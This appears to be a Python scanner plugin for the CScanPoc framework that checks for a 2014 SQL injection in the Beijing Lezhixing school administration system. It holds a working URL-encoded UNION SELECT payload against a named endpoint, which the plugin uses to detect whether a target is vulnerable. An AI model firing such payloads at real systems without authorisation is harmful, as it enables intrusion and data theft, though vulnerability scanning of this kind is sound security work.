# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Lezhixing_0001'  # 平台漏洞编号，留空
    name = '北京乐知行教务系统 SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-04'  # 漏洞公布时间
    desc = '''
        乐知行教学系统是北京讯飞乐知行软件有限公司打造的一款教学管理一体化系统。
        北京乐知行教务系统 /datacenter/downloadApp/loadAppInfo.do SQL注射漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=085320'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '乐知行教务系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '09bc3a4d-570d-4257-a994-0c5ba23cb0bb'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # ref http://www.wooyun.org/bugs/wooyun-2014-085320
            payload = '/datacenter/downloadApp/loadAppInfo.do?1414310370856&appId=f889bbb1102247d2ae00c85dbdd51ea8&versionType=%27%20UNION%20ALL%20SELECT%20%20md5%28%27xxx%27%29%20%20--%20%20'
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 200 and 'f561aaf6ef0bf14d4208bb46a4ccb3ad' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
